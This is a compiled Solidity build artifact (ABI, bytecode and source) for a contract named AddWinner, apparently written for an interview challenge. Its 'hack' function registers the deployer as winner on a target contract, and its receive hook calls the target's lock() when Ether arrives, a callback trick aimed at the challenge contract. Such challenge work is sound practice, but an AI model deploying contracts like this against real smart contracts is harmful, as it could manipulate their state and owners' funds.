{
  "contractName": "AddWinner",
  "abi": [
    {
      "inputs": [],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "nonpayable",
      "type": "fallback"
    },
    {
      "inputs": [],
      "name": "deployerAddr",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "stateMutability": "payable",
      "type": "receive",
      "payable": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "target",
          "type": "address"
        }
      ],
      "name": "hack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60a060405234801561001057600080fd5b503373ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff168152505060805161031461006760003960008181610190015261020201526103146000f3fe60806040526004361061002d5760003560e01c80636c4c174f146100be578063f0c41d74146100e7576100b0565b366100b05760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f83d08ba6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561009a57600080fd5b505af11580156100ae573d6000803e3d6000fd5b005b3480156100bc57600080fd5b005b3480156100ca57600080fd5b506100e560048036038101906100e09190610287565b610112565b005b3480156100f357600080fd5b506100fc610200565b60405161010991906102c3565b60405180910390f35b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16630a3b0a4f7f00000000000000000000000000000000000000000000000000000000000000006040518263ffffffff1660e01b81526004016101cb91906102c3565b600060405180830381600087803b1580156101e557600080fd5b505af11580156101f9573d6000803e3d6000fd5b5050505050565b7f000000000000000000000000000000000000000000000000000000000000000081565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061025482610229565b9050919050565b61026481610249565b811461026f57600080fd5b50565b6000813590506102818161025b565b92915050565b60006020828403121561029d5761029c610224565b5b60006102ab84828501610272565b91505092915050565b6102bd81610249565b82525050565b60006020820190506102d860008301846102b4565b9291505056fea2646970667358221220ac8af9270e8279c3bb70fc9133fee8d7feb9d9dedc0622d80df4fb5808f318a164736f6c63430008110033",
  "immutableReferences": {
    "12": [
      {
        "length": 32,
        "start": 400
      },
      {
        "length": 32,
        "start": 514
      }
    ]
  },
  "source": "// SPDX-License-Identifier: Deepanshu\npragma solidity ^0.8.17;\n\ninterface Task {\n    function add(address winner) external;\n\n    function lock() external;\n}\n\ncontract AddWinner {\n    address public immutable deployerAddr;\n\n    constructor() {\n        deployerAddr = msg.sender;\n    }\n\n    address target_contract;\n\n    function hack(address target) external {\n        target_contract = target;\n        Task(target_contract).add(deployerAddr);\n    }\n\n    receive() external payable {\n        Task(target_contract).lock();\n    }\n\n    fallback() external {}\n}\n",
  "sourcePath": "/Users/deepanshusingh/blockchain projects/teesta_interview/contracts/AddWinner.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.17+commit.8df45f5f.Emscripten.clang"
  },
  "schemaVersion": "3.4.10",
  "updatedAt": "2022-11-09T22:21:31.418Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}